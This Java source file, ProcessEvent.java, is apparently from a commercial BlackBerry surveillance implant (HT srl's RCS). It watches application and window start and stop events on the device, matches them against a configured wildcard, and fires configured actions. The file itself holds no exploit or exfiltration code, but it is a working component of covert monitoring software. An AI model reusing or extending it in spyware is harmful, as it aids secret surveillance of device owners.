//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ProcessEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.action.Action;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.ApplicationObserver;
import blackberry.utils.Check;
import blackberry.utils.WChar;


/**
 * The Class ProcessEvent.
 */
public final class ProcessEvent extends Event implements ApplicationObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ProcessEvent", DebugLevel.INFORMATION);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    boolean processType;

    String process;

    /**
     * Instantiates a new process event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public ProcessEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_PROCESS, actionId, confParams, "ProcessEvent");
        setPeriod(NEVER);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        //#ifdef DEBUG
        debug.trace("actualRun");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif
        AppListener.getInstance().addApplicationObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif
        AppListener.getInstance().removeApplicationObserver(this);
    }

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {

        String started, stopped;

        if (processType) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: PROCESS (mod)");
            //#endif
            started = startedMod;
            stopped = stoppedMod;
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: WINDOWS (name)");
            //#endif
            started = startedName;
            stopped = stoppedName;
        }

        if (actionOnEnter != Action.ACTION_NULL && matchStar(process, started)) {
            //#ifdef DEBUG
            debug.info("triggering enter: " + process);
            //#endif
            trigger(actionOnEnter);
        }

        if (actionOnExit != Action.ACTION_NULL && matchStar(process, stopped)) {
            //#ifdef DEBUG
            debug.info("triggering exit: " + process);
            //#endif
            trigger(actionOnExit);
        }
    }

    static boolean matchStar(String wildcardProcess, String processName) {

    	if(processName==null){
    		return (wildcardProcess==null);
    	}
    	
        for (;;) {

            if (wildcardProcess.length() == 0) {
                return (processName.length() == 0);
            }

            if (wildcardProcess.charAt(0) == '*') {
                wildcardProcess = wildcardProcess.substring(1);
                if (wildcardProcess.length() == 0) {
                    return true;
                }

                if (wildcardProcess.charAt(0) != '?' && wildcardProcess.charAt(0) != '*') {
                    int len = processName.length();
                    for (int i = 0; i < len; i++) {
                        char c = processName.charAt(0);
                        processName = processName.substring(1);
                        String tp = wildcardProcess.substring(1);
                        if (c == wildcardProcess.charAt(0) && matchStar(tp, processName)) {
                            return true;
                        }
                    }
                    return false;
                }

                for (int i = 0; i < processName.length(); i++) {
                    char c = processName.charAt(i);
                    processName = processName.substring(1);
                    if (matchStar(wildcardProcess, processName)) {
                        return true;
                    }
                }
                return false;
            }

            if (processName.length() == 0) {
                return false;
            }

            if (wildcardProcess.charAt(0) != '?' && wildcardProcess.charAt(0) != processName.charAt(0)) {
                return false;
            }

            processName = processName.substring(1);
            wildcardProcess = wildcardProcess.substring(1);
        }

        //NOTREACHED 
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {

        //#ifdef DBC
        Check.requires(confParams != null, "parse conf null");
        Check.requires(confParams.length > 12, "parse conf null");
        //#endif

        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();

            final int value = databuffer.readInt();
            processType = value == 0; // 0: process, 1: window;

            final int len = databuffer.readInt();

            //#ifdef DBC
            Check.asserts(len > 0 && len < 100, "parse wrong len: " + len);
            //#endif
            final byte[] payload = new byte[len];
            databuffer.read(payload);

            process = WChar.getString(payload, true);

            //#ifdef DBC
            Check.asserts(actionOnEnter >= Action.ACTION_NULL,
                    "negative value Enter");
            Check.asserts(actionOnExit >= Action.ACTION_NULL,
                    "negative value Exit");
            //#endif

        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG
        final StringBuffer sb = new StringBuffer();
        sb.append("enter: " + actionOnEnter);
        sb.append(" exit: " + actionOnExit);
        sb.append(" type: " + (processType ? "WIN" : "PROC"));
        sb.append(" process: " + process);
        debug.info(sb.toString());
        //#endif

        return true;
    }

}
